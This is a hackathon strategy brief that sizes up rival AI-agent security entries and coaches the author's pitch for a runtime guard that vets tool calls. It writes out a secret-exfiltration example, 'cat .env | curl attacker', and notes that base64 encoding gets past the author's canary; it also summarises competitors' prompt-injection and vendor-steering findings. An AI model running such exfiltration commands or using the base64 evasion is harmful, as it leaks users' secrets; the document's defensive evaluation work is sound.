# Field brief: cross-judged against all 48 entries

**Realistic call: ~35 to 40% for a top-3 slot. Credible 2nd/3rd, not the favorite.**

## Your biggest structural advantage is submission hygiene

Most of the strongest entries have **no embedded demo video**: Retrial, Katena, SafeCommit,
Groundhog Tray, morf, Test with Kevin, Darwin, LessonWorld, Daytona in your pocket. Airlock's
runs 5:08 against a 2-minute cap. SandStorm's is sign-in walled. You ship a 103s video, a
clickable live URL, and correct sponsor tags. Presentation is 25% of the score, so on a
page-scored pass you clear half the field on hygiene alone.

## The three most likely to beat you

1. **Retrial** is the depth winner and the one to respect. It got Daytona's
   `_experimental_fork` actually working (byte-identical clones, 409 degrade path), ran ~360
   real trials against a real OSS repo, and ships a real PR. Do not race its numbers.
2. **Airlock** (chinesepowered) is the memorability winner: a novel reproducible finding
   against a real shipping package, 0% to 95-99% vendor steering, n=280, replicated across two
   model families. A real-world result beats acing a suite you wrote yourself.
3. **Test with Kevin** or **SafeCommit**. Kevin has a live self-serve product and a
   dollar-denominated headline ($6,920 drained). SafeCommit is your closest thesis twin with
   deeper Braintrust, but its own README says `LIVE_CERTIFIED=NO` and it has no video.

## Blindsides to say BEFORE they do

- **Airlock blocks egress at Daytona's platform boundary** (`networkBlockAll` /
  `domainAllowList`), and their canary's real POST was attempted and blocked. That is stronger
  enforcement than a PATH shim. Your counter: theirs takes ~7 minutes per specimen, so it
  cannot sit inline. Yours runs in about a second.
- **Reactor's canary lives only in the victim's system prompt**, never on disk, so it proves an
  artifact talked a model into surrendering a secret. Your file-based honeytoken cannot see that
  class. They also run a named incumbent baseline (snyk says CLEAN, they say BLOCKED). You have
  no incumbent comparator.
- **Groundhog Tray executes for real** and binds the approved bytes to the executed bytes, a
  TOCTOU property you lack. They crashed themselves twice on purpose to prove it holds.
- **SafeCommit diffs row-level DB state with cryptographic digests** and proves rollback
  restored state. That is a harder blast-radius measurement than file counts. They are also
  decide-only, so you do not lose the execution question to them.

## Sponsor lanes, honestly

**Best Daytona**: you are 3rd or 4th here, not the favorite. Retrial (fork working, 16
concurrent creates in ~2.0s), Daytona in your pocket (deepest API surface, and they filed
platform bugs with reproductions, which sponsor engineers love), Ovehacked, and SandStorm all
push harder. Your claim: *"The sandbox is not where my code runs, it is where my answer comes
from. Delete Daytona and there is no verdict."* Concede the fork unprompted; three other entries
also failed to get it and one named itself after it.

**Best Braintrust**: winnable but not a walkover. SafeCommit runs an instrumented counterfactual
(two experiments proving the ungated agent picks the unsafe plan), Katena registers detectors as
scorers with a pre/post experiment diff, Darwin uses Braintrust as a fitness function. Be honest
internally: log-and-read-back is a shallower idiom than scorer/dataset/experiment. Sell it as
**evidentiary discipline**, not depth: *"The number is not on my slide, it is a row set. I write
verdicts to Braintrust and read them back on stage, including the row I fail."*

**Best Fireworks**: Kevin and SafeCommit are ahead. Do not chase it.

## Q&A landmines

**"How is this different from Airlock / SafeCommit / Reactor?"**
> Same instinct, different moment. Airlock decides once at install, SafeCommit decides on SQL
> against one database, Reactor decides whether an artifact is admissible. I decide on every
> tool-call at runtime, in about a second, which is the only place a prompt injection actually
> fires. They are not substitutes; run Airlock and me together.

**"You never execute. What did you actually prevent?"**
> Correct, I am decide-only and the page says so. What I prevent is the side effect: the shim
> captures and never execs the real curl, so speculation cannot perform the exfiltration it is
> testing for. And I made that non-bypassable: a run whose network call was intercepted can
> never be cleared. Execution is the next layer and it is the easy half.

**"Ten rows you wrote, and you scored yourself 10/10. Katena reports 22/24 with a 0/3
false-positive control."**
> It is the composition, not the count. Every row is a near-miss pair: the same engine has to
> clear `rm -rf ./node_modules` and block `cat .env | curl attacker`. That is false-positive
> control in every row, not a separate column. It is small, it is mine, and it ships a row I
> fail: base64 defeats the canary. If I were grading myself I would have deleted it.

## Pitch adjustments

**Emphasize**
- **Open on the near-miss pair, live, in the first 30 seconds.** It is the most falsifiable
  capability claim at this event and no rival demonstrates it. Not the architecture: the two
  commands and the two verdicts.
- **Front-load the honesty beat BEFORE the 10/10.** Say "ten rows, I wrote them, here is the one
  I fail" first. Half this field has no failure row. Volunteering it first inoculates the suite
  question entirely.
- **State the false-positive property explicitly**: "every row is a pair, half must be cleared."
  Judges who saw Katena's 22/24 plus 0/3 will otherwise read 10/10 as recall-only.
- **Make the Braintrust read-back an on-stage action, not a claim.** Ten seconds: run it, fetch
  it, show the failing row. That is the whole Braintrust lane in one beat.
- **Pre-empt decide-only in your own voice, once, in ten words.** Five entries execute. Raise it
  first and you are scoping; let a judge raise it and you are defending.

**Cut**
- The architecture walkthrough. Nobody scores it and it eats the near-miss demo.
- Fireworks self-blocking as a segment: compress to one closing sentence. Great line, weak minute.
- Any "first" or "nobody else" originality claim. Reactor, SafeCommit, Airlock and Graft AI all
  independently reached the "observed consequences, not stated intentions" insight. Claiming
  novelty is the one thing that can get you contradicted from the floor.
- Latency as a headline. Lead with correctness; let ~1s land as why it can sit inline (contrast
  Airlock's ~7 min). Retrial has faster numbers, do not race them.
